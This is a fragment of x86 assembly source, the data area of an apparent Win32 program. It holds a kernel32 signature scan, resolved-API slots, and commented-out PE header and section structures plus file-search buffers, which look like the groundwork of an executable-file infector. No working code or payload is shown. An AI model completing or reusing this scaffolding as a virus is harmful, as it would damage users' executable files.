
msg                     macro   x
                        db      x,0
                        endm

names:
                        msg     'ExitProcess'
                        ;msg     'FindFirstFileA'
                        ;msg     'FindNextFileA'
                        ;msg     'CreateFileA'
                        ;msg     'SetFilePointer'
                        ;msg     'ReadFile'
                        ;msg     'WriteFile'
                        ;msg     'CloseHandle'
                        ;msg     'GetCurrentDirectoryA'
                        ;msg     'SetCurrentDirectoryA'
                        ;msg     'GetWindowsDirectoryA'
                        ;msg     'GetCommandLineA'
                        ;msg     'WinExec'
                        ;msg     'SetPriorityClass'
                        ;msg     'GetModuleHandleA'
                        ;msg     'GetLastError'
                        msg     'LoadLibraryA'
                        msg     'GetProcAddress'
                        db 0

; ===================== data area ===========================================

kernel_sign:
                        ;db      5 dup (?)       ; <-- kernel

                        dd      5350FC9Ch
                        db       52h

kernel_sign_size        equ     $-kernel_sign

kernel_call             dd      ?

funcnum                 dd      ?
nameptr                 dd      ?
ordinalptr              dd      ?
entrypointptr           dd      ?

fns:
fn_ExitProcess          dd      ?
;fn_FindFirstFileA       dd      ?
;fn_FindNextFileA        dd      ?
;fn_CreateFileA          dd      ?
;fn_SetFilePointer       dd      ?
;fn_ReadFile             dd      ?
;fn_WriteFile            dd      ?
;fn_CloseHandle          dd      ?
;fn_GetCurrentDirectoryA dd      ?
;fn_SetCurrentDirectoryA dd      ?
;fn_GetWindowsDirectoryA dd      ?
;fn_GetCommandLineA      dd      ?
;fn_WinExec              dd      ?
;fn_SetPriorityClass     dd      ?
;fn_GetModuleHandleA     dd      ?
;fn_GetLastError         dd      ?
fn_LoadLibraryA         dd      ?
fn_GetProcAddress       dd      ?

handle                  dd      ?
bytesread               dd      ?

;names                   db      512 dup (?)

;copyright               db      512 dup (?)

;searchhandle            dd      ?

;win32_data_thang:
;fileattr                dd      0
;createtime              dd      0,0
;lastaccesstime          dd      0,0
;lastwritetime           dd      0,0
;filesize                dd      0,0
;resv                    dd      0,0
;fullname                db      256 dup (0)
;realname                db      256 dup (0)

;exefiles                db      32 dup (?)

;peheaderoffset          dd      ?
;objecttableoffset       dd      ?

;newobject:
;oname                   db      8 dup (0)
;virtualsize             dd      0
;RVA                     dd      0
;physicalsize            dd      0
;physicaloffset          dd      0
;reserved                dd      0,0,0
;objectflags             dd      ?  ; 40h,0,0,0c0h
;newobject_size          equ     $-newobject


;peheader:
;signature               dd      0
;cputype                 dw      0
;numObj                  dw      0
;                        dd      3 dup (0)
;NtHeaderSize            dw      0
;Flags                   dw      0
;                        dd      4 dup (0)
;entrypointRVA           dd      0
;                        dd      3 dup (0)
;objalign                dd      0
;filealign               dd      0
;                        dd      4 dup (0)
;imagesize               dd      0
;headersize              dd      0
;peheader_size           equ     $-peheader
;
